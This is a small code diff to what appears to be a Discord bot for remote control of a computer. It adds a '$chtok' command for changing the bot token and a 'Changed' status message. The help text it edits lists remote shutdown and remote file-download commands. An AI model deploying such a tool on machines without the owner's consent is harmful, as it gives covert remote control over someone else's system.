@@ -13,6 +13,7 @@ $help - show this message
 $chmd mode - change working mode (modes: 0 - basic, 1 - filesystem)
 $shutdown [time] - shutdown (time - time before shutdown in secs)
 $download link savepath - download file (link - link to file, savepath - where to save with filename)
+$chtok token - change bot token (token - discord bot token)
 $exit - close session
 
 ==Command Line==
@@ -62,6 +63,7 @@ COPIED = 'Copied'
 MOVED = 'Moved'
 REMOVED = 'Removed'
 DOWNLOADED = 'Downloaded'
+CHANGED = 'Changed'
 
 ERR_COMMAND = 'COMMAND ERROR: '
 ERR_ARG = 'ARGUMENT ERROR: '
